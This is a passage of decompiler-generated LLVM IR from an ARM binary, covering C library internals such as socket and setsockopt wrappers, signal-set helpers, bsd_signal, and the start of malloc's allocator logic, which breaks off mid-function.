dec_label_pc_119f8:                               ; preds = %entry
  store i32 %v3_119c0, i32* @r4, align 4
  store i32 %v12_119c0, i32* @r7, align 4
  store i32 %v15_119c0, i32* @r8, align 4
  store i32 %v18_119c0, i32* %sb.global-to-local, align 4
  %v0_11a00 = call i32 @__sys_sendto()
  br label %dec_label_pc_11a04

dec_label_pc_11a04:                               ; preds = %entry, %dec_label_pc_119f8
  %v0_11a04 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_11a04, i32* @r5, align 4
  %v0_11a18 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_11a18, i32* @r0, align 4
  %v0_11a20 = call i32 @__sys_sendto()
  store i32 %v0_11a20, i32* @r4, align 4
  %v0_11a28 = load i32, i32* @r5, align 4
  %v1_11a2c = call i32 @__libc_disable_asynccancel(i32 %v0_11a28)
  %v0_11a30 = load i32, i32* @r4, align 4
  %v2_11a38 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_11a38, i32* @r4, align 4
  store i32 %v6_119c0, i32* @r5, align 4
  store i32 %v9_119c0, i32* @r6, align 4
  store i32 %v12_119c0, i32* @r7, align 4
  store i32 %v15_119c0, i32* @r8, align 4
  store i32 %v18_119c0, i32* @sb, align 4
  store i32 %v21_119c0, i32* @sl, align 4
  store i32 %v24_119c0, i32* @lr, align 4
  ret i32 %v0_11a30

; uselistorder directives
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11a04, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_11a48 = load i32, i32* @r4, align 4
  store i32 %v3_11a48, i32* %stack_var_-12, align 4
  %v0_11a58 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11a58, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11a58, -4095
  br i1 %tmp, label %dec_label_pc_11a80, label %dec_label_pc_11a68

dec_label_pc_11a68:                               ; preds = %entry
  %v0_11a6c = call i32 @__aeabi_read_tp()
  %v3_11a70 = load i16, i16* @global_var_21a38.351, align 2
  %v4_11a70 = sext i16 %v3_11a70 to i32
  store i32 %v4_11a70, i32* @r3, align 4
  %v0_11a74 = load i32, i32* %r2.global-to-local, align 4
  %v1_11a74 = sub i32 0, %v0_11a74
  store i32 %v1_11a74, i32* %r2.global-to-local, align 4
  %v3_11a78 = add i32 %v4_11a70, %v0_11a6c
  %v4_11a78 = inttoptr i32 %v3_11a78 to i32*
  store i32 %v1_11a74, i32* %v4_11a78, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11a80.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_11a80

dec_label_pc_11a80:                               ; preds = %entry, %dec_label_pc_11a68
  %v1_11a84 = phi i32 [ %v0_11a58, %entry ], [ -1, %dec_label_pc_11a68 ]
  %v2_11a80 = phi i32 [ %v3_11a48, %entry ], [ %v2_11a80.pre, %dec_label_pc_11a68 ]
  store i32 %v2_11a80, i32* @r4, align 4
  ret i32 %v1_11a84

; uselistorder directives
  uselistorder i32 %v0_11a58, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11a80, { 1, 0 }
}

define i32 @"$d.1"(i32 %arg1) local_unnamed_addr {
dec_label_pc_11a88:
  %v0_11a88 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11a88, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11a88
  %v2_11a88 = load i32, i32* @r6, align 4
  %v5_11a88 = udiv i32 %v2_11a88, 4
  %v6_11a88 = and i32 %v5_11a88, %arg1
  call void @__pseudo_branch(i32 0)
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11a88, %bb
  %v7_11a8c = phi i32 [ %arg1, %dec_label_pc_11a88 ], [ %v6_11a88, %bb ]
  ret i32 %v7_11a8c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11a90 = load i32, i32* @r7, align 4
  store i32 %v3_11a90, i32* %stack_var_-8, align 4
  %v0_11a9c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11a9c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11a9c, -4095
  br i1 %tmp, label %dec_label_pc_11ac4, label %dec_label_pc_11aac

dec_label_pc_11aac:                               ; preds = %entry
  %v0_11ab0 = call i32 @__aeabi_read_tp()
  %v3_11ab4 = load i16, i16* @global_var_21a38.351, align 2
  %v4_11ab4 = sext i16 %v3_11ab4 to i32
  store i32 %v4_11ab4, i32* @r3, align 4
  %v0_11ab8 = load i32, i32* %r2.global-to-local, align 4
  %v1_11ab8 = sub i32 0, %v0_11ab8
  store i32 %v1_11ab8, i32* %r2.global-to-local, align 4
  %v3_11abc = add i32 %v4_11ab4, %v0_11ab0
  %v4_11abc = inttoptr i32 %v3_11abc to i32*
  store i32 %v1_11ab8, i32* %v4_11abc, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11ac4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11ac4

dec_label_pc_11ac4:                               ; preds = %entry, %dec_label_pc_11aac
  %v1_11ac8 = phi i32 [ %v0_11a9c, %entry ], [ -1, %dec_label_pc_11aac ]
  %v2_11ac4 = phi i32 [ %v3_11a90, %entry ], [ %v2_11ac4.pre, %dec_label_pc_11aac ]
  store i32 %v2_11ac4, i32* @r7, align 4
  ret i32 %v1_11ac8

; uselistorder directives
  uselistorder i32 %v0_11a9c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11ac4, { 1, 0 }
}

define i32 @"$d"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11acc:
  %v0_11acc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11acc, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11acc
  %v3_11ad0 = call i32 @__libc_errno()
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11acc, %bb
  %v4_11ad0 = phi i32 [ %arg1, %dec_label_pc_11acc ], [ %v3_11ad0, %bb ]
  ret i32 %v4_11ad0

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp4 = icmp slt i32 %arg2, 1
  br i1 %tmp4, label %dec_label_pc_11aec, label %dec_label_pc_11ae4

dec_label_pc_11ae4:                               ; preds = %entry
  %v7_11ae8 = icmp slt i32 %arg2, 65
  br i1 %v7_11ae8, label %dec_label_pc_11b08, label %dec_label_pc_11aec

dec_label_pc_11aec:                               ; preds = %dec_label_pc_11ae4, %entry
  %v0_11af0 = call i32 @__aeabi_read_tp()
  %v3_11af4 = load i16, i16* @global_var_21a38.351, align 2
  %v4_11af4 = sext i16 %v3_11af4 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_11b00 = add i32 %v4_11af4, %v0_11af0
  %v4_11b00 = inttoptr i32 %v3_11b00 to i32*
  store i32 22, i32* %v4_11b00, align 4
  %v0_11b10.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11b10

dec_label_pc_11b08:                               ; preds = %dec_label_pc_11ae4
  %v0_11b08 = call i32 @__sigaddset()
  store i32 %v0_11b08, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11b10

dec_label_pc_11b10:                               ; preds = %dec_label_pc_11aec, %dec_label_pc_11b08
  %v0_11b10 = phi i32 [ %v0_11b10.pre, %dec_label_pc_11aec ], [ %v0_11b08, %dec_label_pc_11b08 ]
  ret i32 %v0_11b10

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11b10, { 1, 0 }
}

define i32 @sigemptyset(i32* %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v2_11b2c = add i32 %tmp, 4
  %v3_11b2c = inttoptr i32 %v2_11b2c to i32*
  store i32 0, i32* %v3_11b2c, align 4
  %v1_11b30 = load i32, i32* %r3.global-to-local, align 4
  %v2_11b30 = inttoptr i32 %v1_11b30 to i32*
  store i32 0, i32* %v2_11b30, align 4
  ret i32 0
}

define i32 @bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_11b38 = load i32, i32* @r4, align 4
  store i32 %v3_11b38, i32* %stack_var_-16, align 4
  %v6_11b38 = load i32, i32* @r5, align 4
  %v9_11b38 = load i32, i32* @r6, align 4
  %v7_11b40 = icmp eq i32 %arg2, -1
  br i1 %v7_11b40, label %.thread4, label %bb

.thread4:                                         ; preds = %entry
  br label %.thread16

bb:                                               ; preds = %entry
  %v2_11b48 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %arg1, i32* @r5, align 4
  %tmp28 = icmp slt i32 %arg1, 1
  br i1 %tmp28, label %.thread16, label %dec_label_pc_11b64

.thread16:                                        ; preds = %bb, %.thread4
  br label %dec_label_pc_11b6c

dec_label_pc_11b64:                               ; preds = %bb
  store i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32* @r6, align 4
  %v7_11b68 = icmp slt i32 %arg1, 65
  br i1 %v7_11b68, label %dec_label_pc_11b88, label %dec_label_pc_11b6c

dec_label_pc_11b6c:                               ; preds = %.thread16, %dec_label_pc_11b64
  %v0_11b70 = call i32 @__aeabi_read_tp()
  %v3_11b74 = load i16, i16* @global_var_21a38.351, align 2
  %v4_11b74 = sext i16 %v3_11b74 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_11b80 = add i32 %v4_11b74, %v0_11b70
  %v4_11b80 = inttoptr i32 %v3_11b80 to i32*
  store i32 22, i32* %v4_11b80, align 4
  %v0_11be0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb33

dec_label_pc_11b88:                               ; preds = %dec_label_pc_11b64
  %v2_11b88 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_11b88, i32* @r4, align 4
  store i32 %arg1, i32* @r1, align 4
  %v2_11b90 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_11b90, i32* @r0, align 4
  store i32 %arg2, i32* %stack_var_-36, align 4
  store i32 0, i32* %stack_var_-24, align 4
  %v0_11ba0 = call i32 @__sigaddset()
  %v0_11ba8 = load i32, i32* @r5, align 4
  store i32 %v0_11ba8, i32* %r1.global-to-local, align 4
  %v0_11bac = load i32, i32* @r6, align 4
  %v2_11bac = add i32 %v0_11bac, 11896
  %v2_11bb0 = call i32 @__GI___sigismember(i32 %v2_11bac, i32 %v0_11ba8)
  store i32 %v2_11b88, i32* %r1.global-to-local, align 4
  %v0_11bc4 = load i32, i32* @r5, align 4
  %v3_11bd0 = call i32 @__libc_sigaction(i32 %v0_11bc4, i32 %v2_11b88, i32 %v2_11b48)
  %v1_11bd4 = icmp slt i32 %v3_11bd0, 0
  br i1 %v1_11bd4, label %bb32, label %bb31

bb31:                                             ; preds = %dec_label_pc_11b88
  %v5_11bd8 = load i32, i32* %stack_var_-56, align 4
  store i32 %v5_11bd8, i32* %r1.global-to-local, align 4
  br label %bb33

bb32:                                             ; preds = %dec_label_pc_11b88
  store i32 -1, i32* %r1.global-to-local, align 4
  br label %bb33

bb33:                                             ; preds = %bb31, %dec_label_pc_11b6c, %bb32
  %v0_11be0 = phi i32 [ %v5_11bd8, %bb31 ], [ %v0_11be0.pre, %dec_label_pc_11b6c ], [ -1, %bb32 ]
  %v2_11be8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_11be8, i32* @r4, align 4
  store i32 %v6_11b38, i32* @r5, align 4
  store i32 %v9_11b38, i32* @r6, align 4
  ret i32 %v0_11be0

; uselistorder directives
  uselistorder i32 %v2_11b88, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 ()* @__sigaddset, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 3, 0, 1 }
  uselistorder label %bb33, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11b6c, { 1, 0 }
}

define i32 @__GI___sigismember(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_11bfc = add i32 %arg2, -1
  %v3_11c00 = udiv i32 %v1_11bfc, 32
  %v4_11c04 = mul nuw nsw i32 %v3_11c00, 4
  %v5_11c04 = add i32 %v4_11c04, %arg1
  %v6_11c04 = inttoptr i32 %v5_11c04 to i32*
  %v7_11c04 = load i32, i32* %v6_11c04, align 4
  %v1_11c08 = urem i32 %v1_11bfc, 32
  %v7_11c10 = shl i32 1, %v1_11c08
  %v8_11c10 = and i32 %v7_11c04, %v7_11c10
  %v10_11c10 = icmp ne i32 %v8_11c10, 0
  %. = zext i1 %v10_11c10 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v1_11bfc, { 1, 0 }
}

define i32 @__sigaddset() local_unnamed_addr {
entry:
  %v0_11c20 = load i32, i32* @r1, align 4
  %v1_11c20 = add i32 %v0_11c20, -1
  %v3_11c24 = udiv i32 %v1_11c20, 32
  %v0_11c28 = load i32, i32* @r0, align 4
  %v4_11c28 = mul nuw nsw i32 %v3_11c24, 4
  %v5_11c28 = add i32 %v0_11c28, %v4_11c28
  %v6_11c28 = inttoptr i32 %v5_11c28 to i32*
  %v7_11c28 = load i32, i32* %v6_11c28, align 4
  %v1_11c2c = urem i32 %v1_11c20, 32
  %v7_11c34 = shl i32 1, %v1_11c2c
  %v8_11c34 = or i32 %v7_11c28, %v7_11c34
  store i32 %v8_11c34, i32* %v6_11c28, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_11c20, { 1, 0 }
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_11c44 = add i32 %arg2, -1
  %v3_11c48 = udiv i32 %v1_11c44, 32
  %v4_11c4c = mul nuw nsw i32 %v3_11c48, 4
  %v5_11c4c = add i32 %v4_11c4c, %arg1
  %v6_11c4c = inttoptr i32 %v5_11c4c to i32*
  %v7_11c4c = load i32, i32* %v6_11c4c, align 4
  %v1_11c50 = urem i32 %v1_11c44, 32
  %tmp = shl i32 -1, %v1_11c50
  %v8_11c58 = add i32 %tmp, -1
  %v9_11c58 = and i32 %v7_11c4c, %v8_11c58
  store i32 %v9_11c58, i32* %v6_11c4c, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_11c44, { 1, 0 }
}

define i32 @__malloc_largebin_index(i32 %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %v3_11c68 = udiv i32 %arg1, 256
  store i32 %v3_11c68, i32* %r1.global-to-local, align 4
  %v2_11c6c = icmp ugt i32 %arg1, 16777215
  store i32 %arg1, i32* %ip.global-to-local, align 4
  br i1 %v2_11c6c, label %bb, label %bb1

bb:                                               ; preds = %entry
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  %v0_11c78 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_11c6c, i32 %v0_11c78)
  %v0_11c7c = load i32, i32* %r1.global-to-local, align 4
  %v1_11c7c = add i32 %v0_11c7c, 1048320
  %v3_11c80 = udiv i32 %v1_11c7c, 65536
  %v1_11c84 = and i32 %v3_11c80, 8
  %v6_11c88 = shl i32 %v0_11c7c, %v1_11c84
  %v1_11c8c = add i32 %v6_11c88, 520192
  %v3_11c90 = udiv i32 %v1_11c8c, 65536
  %v1_11c94 = and i32 %v3_11c90, 4
  %v6_11c98 = shl i32 %v6_11c88, %v1_11c94
  %v1_11c9c = add i32 %v6_11c98, 245760
  %v3_11ca0 = udiv i32 %v1_11c9c, 65536
  %v1_11ca4 = and i32 %v3_11ca0, 2
  %v6_11ca8 = shl i32 %v6_11c98, %v1_11ca4
  store i32 %v6_11ca8, i32* %r1.global-to-local, align 4
  %v1_11cac = sub nsw i32 13, %v1_11c84
  %v2_11cb0 = sub nsw i32 %v1_11cac, %v1_11c94
  %v3_11cb4 = udiv i32 %v6_11ca8, 32768
  %v4_11cb4 = sub nuw nsw i32 -1, %v3_11cb4
  %v4_11cb8 = udiv i32 %v6_11ca8, 16384
  %v5_11cb8 = and i32 %v4_11cb8, %v4_11cb4
  %v2_11cbc = sub nsw i32 %v2_11cb0, %v1_11ca4
  %v2_11cc0 = add nsw i32 %v2_11cbc, %v5_11cb8
  %v1_11cc4 = add nsw i32 %v2_11cc0, 6
  %v0_11cc8 = load i32, i32* %ip.global-to-local, align 4
  %v6_11cc8 = lshr i32 %v0_11cc8, %v1_11cc4
  %v3_11ccc = mul nsw i32 %v2_11cc0, 4
  %v1_11cd0 = add nsw i32 %v3_11ccc, 32
  %v1_11cd4 = urem i32 %v6_11cc8, 4
  %v2_11cd8 = or i32 %v1_11cd4, %v1_11cd0
  ret i32 %v2_11cd8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @malloc() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_11ce0 = load i32, i32* @r4, align 4
  %v6_11ce0 = load i32, i32* @r5, align 4
  %v9_11ce0 = load i32, i32* @r6, align 4
  %v12_11ce0 = load i32, i32* @r7, align 4
  %v15_11ce0 = load i32, i32* @r8, align 4
  %v18_11ce0 = load i32, i32* @sb, align 4
  %v21_11ce0 = load i32, i32* @sl, align 4
  %v24_11ce0 = load i32, i32* @fp, align 4
  %v27_11ce0 = load i32, i32* @lr, align 4
  store i32 108, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32* %r1.global-to-local, align 4
  %v4_11cf4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 108) to i32*), align 4
  store i32 %v4_11cf4, i32* %r4.global-to-local, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  %v4_11d00 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 68) to i32*), align 4
  store i32 %v4_11d00, i32* %r1.global-to-local, align 4
  %v0_11d04 = load i32, i32* @r0, align 4
  store i32 %v0_11d04, i32* @r5, align 4
  store i32 %v4_11cf4, i32* %r2.global-to-local, align 4
  %v2_11d0c = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_11d0c, i32* %r0.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32* %ip.global-to-local, align 4
  %v4_11d18 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 112) to i32*), align 4
  store i32 %v4_11d18, i32* %ip.global-to-local, align 4
  store i32 72996, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_11d18)
  %v0_11d24 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_11d24, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32* @r1, align 4
  %v4_11d30 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 16) to i32*), align 4
  store i32 %v4_11d30, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_11d3c.439 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_11d30)
  %v0_11d3c = load i32, i32* @r5, align 4
  %tmp = icmp ult i32 %v0_11d3c, -32
  br i1 %tmp, label %dec_label_pc_11d60, label %dec_label_pc_11d44

dec_label_pc_11d44:                               ; preds = %entry
  store i32 64740, i32* %r2.global-to-local, align 4
  %v0_11d48 = call i32 @__aeabi_read_tp()
  store i32 %v0_11d48, i32* %r0.global-to-local, align 4
  %v3_11d4c = load i16, i16* @global_var_21a38.351, align 2
  %v4_11d4c = sext i16 %v3_11d4c to i32
  store i32 %v4_11d4c, i32* %r2.global-to-local, align 4
  store i32 12, i32* @r3, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_11d58 = add i32 %v4_11d4c, %v0_11d48
  %v4_11d58 = inttoptr i32 %v3_11d58 to i32*
  store i32 12, i32* %v4_11d58, align 4
  br label %dec_label_pc_125e4

dec_label_pc_11d60:                               ; preds = %entry
  %v1_11d60 = add i32 %v0_11d3c, 11
  store i32 %v1_11d60, i32* %r0.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32* %r2.global-to-local, align 4
  %v2_11d6c = icmp ugt i32 %v1_11d60, 14
  %v7_11d6c = icmp eq i32 %v1_11d60, 15
  %v2_11d70 = xor i1 %v7_11d6c, true
  %v3_11d70 = and i1 %v2_11d6c, %v2_11d70
  br i1 %v3_11d70, label %bb, label %bb141

bb:                                               ; preds = %dec_label_pc_11d60
  %v5_11d70 = and i32 %v1_11d60, -8
  store i32 %v5_11d70, i32* @sl, align 4
  br label %bb141

bb141:                                            ; preds = %dec_label_pc_11d60, %bb
  %v4_11d74 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 64) to i32*), align 4
  store i32 %v4_11d74, i32* @r0, align 4
  %v1_11d78 = inttoptr i32 %v4_11d74 to i32*
  %v2_11d78 = load i32, i32* %v1_11d78, align 4
  store i32 %v2_11d78, i32* @r4, align 4
  %v2_11d7c = xor i1 %v2_11d6c, true
  %v3_11d7c = or i1 %v7_11d6c, %v2_11d7c
  br i1 %v3_11d7c, label %bb142, label %bb143

bb142:                                            ; preds = %bb141
  store i32 16, i32* @sl, align 4
  br label %bb143

bb143:                                            ; preds = %bb141, %bb142
  %v1_11d80 = urem i32 %v2_11d78, 2
  %v2_11d80 = icmp eq i32 %v1_11d80, 0
  br i1 %v2_11d80, label %dec_label_pc_11d88, label %dec_label_pc_11d98

dec_label_pc_11d88:                               ; preds = %bb143
  %v2_11d88 = icmp eq i32 %v2_11d78, 0
  br i1 %v2_11d88, label %dec_label_pc_11d90, label %dec_label_pc_12174

dec_label_pc_11d90:                               ; preds = %dec_label_pc_11d88
  %v0_11d90 = call i32 @__malloc_consolidate()
  store i32 %v0_11d90, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12174

dec_label_pc_11d98:                               ; preds = %bb143
  %v0_11d98 = load i32, i32* @sl, align 4
  %tmp204 = icmp ugt i32 %v0_11d98, %v2_11d78
  br i1 %tmp204, label %dec_label_pc_11dc0, label %dec_label_pc_11da0

dec_label_pc_11da0:                               ; preds = %dec_label_pc_11d98
  %v1_11da0 = add i32 %v4_11d74, -4
  store i32 %v1_11da0, i32* %r1.global-to-local, align 4
  %v3_11da4 = udiv i32 %v0_11d98, 8
  store i32 %v3_11da4, i32* %r2.global-to-local, align 4
  %v4_11da8 = mul nuw i32 %v3_11da4, 4
  %v5_11da8 = add i32 %v4_11da8, %v1_11da0
  %v6_11da8 = inttoptr i32 %v5_11da8 to i32*
  %v7_11da8 = load i32, i32* %v6_11da8, align 4
  store i32 %v7_11da8, i32* %r0.global-to-local, align 4
  %v2_11dac = icmp eq i32 %v7_11da8, 0
  br i1 %v2_11dac, label %dec_label_pc_11dc0, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_11da0
  %v2_11db0 = add i32 %v7_11da8, 8
  %v3_11db0 = inttoptr i32 %v2_11db0 to i32*
  %v4_11db0 = load i32, i32* %v3_11db0, align 4
  store i32 %v4_11db0, i32* %r3.global-to-local, align 4
  store i32 %v2_11db0, i32* %r0.global-to-local, align 4
  store i32 %v2_11db0, i32* %r4.global-to-local, align 4
  store i32 %v4_11db0, i32* %v6_11da8, align 4
  br label %dec_label_pc_125c8

dec_label_pc_11dc0:                               ; preds = %dec_label_pc_11da0, %dec_label_pc_11d98
  %tmp205 = icmp ugt i32 %v0_11d98, 255
  br i1 %tmp205, label %dec_label_pc_11e10, label %dec_label_pc_11dc8

dec_label_pc_11dc8:                               ; preds = %dec_label_pc_11dc0
  store i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32* %ip.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_11dd0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 64) to i32*), align 4
  %v3_11dd4 = udiv i32 %v0_11d98, 8
  store i32 %v3_11dd4, i32* @r7, align 4
  %v4_11dd8 = mul nuw i32 %v3_11dd4, 8
  %v5_11dd8 = add i32 %v4_11dd0, %v4_11dd8
  store i32 %v5_11dd8, i32* %r3.global-to-local, align 4
  %v1_11ddc = add i32 %v5_11dd8, 44
  store i32 %v1_11ddc, i32* %ip.global-to-local, align 4
  %v1_11de0 = add i32 %v5_11dd8, 56
  %v2_11de0 = inttoptr i32 %v1_11de0 to i32*
  %v3_11de0 = load i32, i32* %v2_11de0, align 4
  store i32 %v3_11de0, i32* %r0.global-to-local, align 4
  %v9_11de4 = icmp eq i32 %v3_11de0, %v1_11ddc
  br i1 %v9_11de4, label %dec_label_pc_11f70, label %dec_label_pc_11dec

dec_label_pc_11dec:                               ; preds = %dec_label_pc_11dc8
  %v2_11dec = add i32 %v3_11de0, %v0_11d98
  store i32 %v2_11dec, i32* %r3.global-to-local, align 4
  %v1_11df0 = add i32 %v2_11dec, 4
  %v2_11df0 = inttoptr i32 %v1_11df0 to i32*
  %v3_11df0 = load i32, i32* %v2_11df0, align 4
  store i32 %v3_11df0, i32* %r2.global-to-local, align 4
  %v1_11df4 = add i32 %v3_11de0, 12
  %v2_11df4 = inttoptr i32 %v1_11df4 to i32*
  %v3_11df4 = load i32, i32* %v2_11df4, align 4
  store i32 %v3_11df4, i32* %r1.global-to-local, align 4
  %v1_11df8 = or i32 %v3_11df0, 1
  store i32 %v1_11df8, i32* %r2.global-to-local, align 4
  %v1_11dfc = add i32 %v3_11de0, 8
  store i32 %v1_11dfc, i32* %r4.global-to-local, align 4
  store i32 %v1_11df8, i32* %v2_11df0, align 4
  %v0_11e04 = load i32, i32* %ip.global-to-local, align 4
  %v1_11e04 = load i32, i32* %r1.global-to-local, align 4
  %v2_11e04 = add i32 %v1_11e04, 8
  %v3_11e04 = inttoptr i32 %v2_11e04 to i32*
  store i32 %v0_11e04, i32* %v3_11e04, align 4
  %v0_11e08 = load i32, i32* %r1.global-to-local, align 4
  %v1_11e08 = load i32, i32* %ip.global-to-local, align 4
  %v2_11e08 = add i32 %v1_11e08, 12
  %v3_11e08 = inttoptr i32 %v2_11e08 to i32*
  store i32 %v0_11e08, i32* %v3_11e08, align 4
  br label %dec_label_pc_125c8

dec_label_pc_11e10:                               ; preds = %dec_label_pc_11dc0
  store i32 %v0_11d98, i32* %r0.global-to-local, align 4
  %v1_11e14 = call i32 @__malloc_largebin_index(i32 %v0_11d98)
  store i32 %v1_11e14, i32* %r0.global-to-local, align 4
  %v0_11e18 = load i32, i32* @r4, align 4
  %v1_11e18 = and i32 %v0_11e18, 2
  %v2_11e18 = icmp eq i32 %v1_11e18, 0
  store i32 %v1_11e14, i32* @r7, align 4
  br i1 %v2_11e18, label %dec_label_pc_11f70, label %dec_label_pc_11e24

dec_label_pc_11e24:                               ; preds = %dec_label_pc_11e10
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32* %r1.global-to-local, align 4
  %v4_11e2c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 64) to i32*), align 4
  store i32 %v4_11e2c, i32* @r0, align 4
  %v0_11e30 = call i32 @__malloc_consolidate()
  store i32 %v0_11e30, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11f70

dec_label_pc_11e38:                               ; preds = %dec_label_pc_11f84
  %v1_11e38 = add i32 %v3_11f84, 4
  %v2_11e38 = inttoptr i32 %v1_11e38 to i32*
  %v3_11e38 = load i32, i32* %v2_11e38, align 4
  store i32 %v3_11e38, i32* %r3.global-to-local, align 4
  %v0_11e3c = load i32, i32* @sl, align 4
  %v1_11e40 = and i32 %v3_11e38, -4
  store i32 %v1_11e40, i32* %r4.global-to-local, align 4
